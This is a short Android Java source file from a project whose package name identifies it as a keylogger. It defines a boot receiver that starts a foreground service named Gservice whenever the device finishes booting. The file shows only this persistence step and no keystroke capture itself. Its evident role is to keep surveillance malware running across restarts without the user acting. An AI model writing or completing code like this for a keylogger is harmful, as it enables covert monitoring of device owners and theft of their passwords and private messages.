package com.hak15tan.hakistankeylogger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import androidx.core.content.ContextCompat;

public class StartOnBootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent i = new Intent(context, Gservice.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ContextCompat.startForegroundService(context, i);
        }
    }
}
